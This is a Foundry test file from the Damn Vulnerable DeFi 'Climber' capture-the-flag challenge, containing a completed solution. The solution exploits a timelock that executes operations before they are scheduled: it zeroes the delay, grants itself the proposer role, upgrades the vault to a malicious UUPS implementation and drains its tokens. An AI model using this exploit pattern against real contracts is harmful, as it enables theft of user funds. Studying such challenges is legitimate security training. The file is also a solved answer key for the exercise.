// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

using SafeERC20 for IERC20;

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        MyContract myContract = new MyContract(vault, timelock, token, recovery);

        myContract.trigger();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract MyContract {
    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;
    address recovery;

    address[] public targetArr;
    uint256[] public valuesArr;
    bytes[] public dataElementsArr;

    constructor(ClimberVault _vault, ClimberTimelock _timelock, DamnValuableToken _token, address _recovery){
        vault = _vault;
        timelock = _timelock;
        token = _token;
        recovery = _recovery;
    }

    function trigger() public {
        newMaliciousImplementation newContract = new newMaliciousImplementation();

        // Tao arr cho exe
        targetArr = new address[](4);
        valuesArr = new uint256[](4);
        dataElementsArr = new bytes[](4);

        // Update delay = 0
        targetArr[0] = address(timelock);
        valuesArr[0] = 0;
        dataElementsArr[0] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);

        // Cap quyen attacker
        targetArr[1] = address(timelock);
        valuesArr[1] = 0;
        dataElementsArr[1] = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(this));

        // Nang cap len hop dong thuc hien moi
        targetArr[2] = address(vault);
        valuesArr[2] = 0;
        dataElementsArr[2] = abi.encodeWithSelector(vault.upgradeToAndCall.selector, address(newContract), "");

        // Thuc hien drain
        targetArr[3] = address(this);
        valuesArr[3] = 0;
        dataElementsArr[3] = abi.encodeWithSelector(this.drain.selector, address(this), "");

        // Exe
        timelock.execute(targetArr, valuesArr, dataElementsArr, bytes32(0));
    }

    function drain() public {
        timelock.schedule(targetArr, valuesArr, dataElementsArr, bytes32(0));
        newMaliciousImplementation(address(vault)).drain(address(token), recovery);
    }
}

contract newMaliciousImplementation is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    function initialize(address admin, address proposer, address sweeper) external initializer {
        __Ownable_init(msg.sender);
        __UUPSUpgradeable_init();
    }

    function drain(address token, address recipient) external {
        // SafeTransferLib.safeTransfer(token, recipient, IERC20(token).balanceOf(address(this)));
        IERC20(token).safeTransfer(recipient, IERC20(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}

// forge test --mp test/climber/Climber.t.sol